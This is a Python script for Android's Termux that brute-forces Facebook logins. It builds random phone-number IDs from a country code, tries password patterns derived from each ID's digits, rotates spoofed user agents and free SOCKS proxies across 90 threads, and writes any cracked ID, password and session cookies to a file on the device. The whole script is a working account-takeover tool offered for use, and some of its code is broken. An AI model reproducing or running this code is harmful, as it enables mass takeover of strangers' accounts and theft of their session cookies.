import os,json,time,uuid,sys,random,base64,shutil,re

try:
    pi=os.listdir("/data/data/com.termux/files/usr/bin")
    if "pip3"  in pi:
        pass
    elif "pip" in pi:
        pass
    else:
        print(" [red] PIP missing.....")
        sys.exit()
except:
    sys.exit("[✓] Something Wrong... ")

os.system("pip3 uninstall rich requests pycurl certifi gtts -y")
os.system("pkg install play-audio")
try:
    import rich, requests, pycurl, certifi,gtts
except:
    os.system("pip3 install rich requests pycurl certifi gtts")
    import rich, requests, pycurl, certifi,gtts


from rich import print
from gtts import gTTS
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from io import BytesIO

from datetime import datetime
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"~"+month.get(today_data[1])

#-----------------

oks,loop,ua,ussr,tw,cps=[],0,[],[],[],[]
oks=[]
cps=[]
ugen=[]
uas=[]
loop=0
#------------- proxy
try:
    rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
except:
    sys.exit(" Internet Error ")
    



fbks = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
AMSS1 = random.choice(['MessengerLite', 'FB4A;FBAV', 'FB4A'])
AMSS2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])

usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for sat in range(1000):
	aa='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{aa}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)

nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]

def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) facebook-nativefier-f52d2f/1.0.0 Chrome/53.0.2785.143 Electron/1.4.16 Safari/537.36"
    return xx

def uax():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx


def line():
    print("[bold bright_cyan]────────────────────────────────────")


logo="""[b]
 [sky_blue]┏┓┓ ┳┏┳┓┏┓  ┏┓┓┏┳┓┏┓┳┓
 [sky_blue]┣ ┃ ┃ ┃ ┣ ━━┃ ┗┫┣┫┣ ┣┫
 [sky_blue]┗┛┗┛┻ ┻ ┗┛  ┗┛┗┛┻┛┗┛┛┗  (v+6.0) """



def menu():
    os.system('clear')
    print(logo)
    line()
  #  print("[b bright_white]  </>! [r violet]USERNAME[/r violet] [light_sky_blue1]   ▶  [/light_sky_blue1] "+ussr[0])
    print(' [1] Random clone... ')
    print(' [2] Contact Admin')
    print(' [3] Exit! ')
    line()
    x=input(' [®] Choice : ')
    if x in ['1','01','A','a']:
        ran()
        #os.system('python menu.py')
    if x in ['b','B','2','02']:
        os.system('xdg-open fb-link ')
    if x in ['c','C','3','03']:
        sys:exit()


def coutpass(pwx):
    j=len(pwx)+1
    if j <9:
        return "0"+str(j)
    else:
        return str(j)
#---------------------------------#-----------@
def ran():
    os.system('clear')
    user=[]
    pwx=[]
    print(logo)
    line()
    print("  [b][BD|IND|PK][chartreuse1] 0171[deep_pink2] +91629[deep_pink1] +920315")
    line()
    code=str(input(" \x1b[38;1;198m </> \x1b[38;5;155mCHOICE      \x1b[38;5;196m>> \x1b[1;97m   "))
    
    line()
    print(" [b] </>[chartreuse1] EXAMPLE      [b deep_pink2]<<[/b deep_pink2]  [chartreuse1] 100000 300000")
    limit=int(input(" \x1b[38;1;198m </> \x1b[38;5;155mCHOICE      \x1b[38;5;196m>> \x1b[1;97m   "))
    line()
    for i in range(limit):
        gd=str(random.choice(range(1000000,9999999)))
        user.append(gd)
    
    passli=int(input(" \x1b[38;1;198m </> \x1b[38;5;155mPass Limit :\x1b[1;97m "))
    line()
    
    while True:
        print(" EXP > first6 last6 sadiya 57273200")
        pas=str(input(f" \x1b[38;1;198m </> \x1b[38;5;155mAdd Pass {coutpass(pwx)} \x1b[38;5;196m>> \x1b[1;97m   "))
        
        if "" ==pas:
            pass
        
        elif pas not in pwx:
            pwx.append(pas)
        line()
        if len(pwx) >=passli:
            break
        else:
            continue
    print(" [1] Method (M)")
    print(" [2] Method (X)")
    print(" [3] Method (P)")
    print(" [4] Method (Touch)")
    print(" [5] Method (Free)")
    print(" [6] Method (Mbasic)")
    line()
    meth=str(input(" </> Choice      \x1b[38;5;196m>> \x1b[1;97m   "))
    if meth in ["1","a","A"]:
        fb="m"
    elif meth in ["2","b","B"]:
        fb="x"
    elif meth in ["3","c","C"]:
        fb="p"
    elif meth in ["4","d","D"]:
        fb="touch"
    elif meth in ["5","e","E"]:
        fb="free"
    else:
        fb="mbasic"
    with ThreadPool(max_workers=90) as akash:
        os.system('clear')
        print(logo)
     #   line()
      #  print("[b bright_white]  </>! [r violet]USERNAME[/r violet] [light_sky_blue1]   ▶  [/light_sky_blue1] "+ussr[0])
        line()
        print(f" </> Today Date  <<   {today} ")
        print(f" </> Total Pas  >>  +{str(len(pwx))}")
        line()
        
        for xd in user:
            uid=code+xd
            akash.submit(rensub,uid,pwx,meth,fb,user)
    print("\r\r"+line())
    print(f"  </> Total OK id : {str(len(oks))}")
    print(f"  </> Save  /sdcard/pot.txt ")
    line()
    sys.exit()



def rensub(uid,pwx,meth,fb,user):
    global oks,loop
    sys.stdout.write(f'\r\033[1;37m [AKASH-M{meth.upper()}\033[1;37m] \033[1;37m[{loop}\033[1;37m]>~<[\033[95m{str(len(user))}\033[1;37m] \033[1;37m\033[1;32m<{str(len(oks))}>\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            session=requests.Session()
            uuu=random.choice(ugen)
            proxs= {'http': 'socks4://'+random.choice(rx)}
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            free_fb = session.get(f'https://{fb}.facebook.com').text
            data={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            header={
'Host': f'{fb}.facebook.com',
'content-length': '1730',
'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
'sec-ch-ua-mobile': '?1',
'user-agent': uax(),
'x-response-format': 'JSONStream',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVo_Z7twFKE',
'viewport-width': '360',
'sec-ch-ua-platform-version': '""',
'x-requested-with': 'XMLHttpRequest',
'x-asbd-id': '129477',
'dpr': '2',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-model': '""',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': f'https://{fb}.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': f'https://{fb}.facebook.com/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post(f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header,proxies=proxs)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15].replace(";","  ") 
                print(f"\r\r[b r green_yellow]AKASH-OK][/b r green_yellow][b chartreuse1]{xd}|{ps}\n[💸]{coki}\n")
                open("/sdcard/pot.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                ok_call()
                break
            else:continue
        loop+=1
    except Exception as e:
        
        time.sleep(40)
menu()
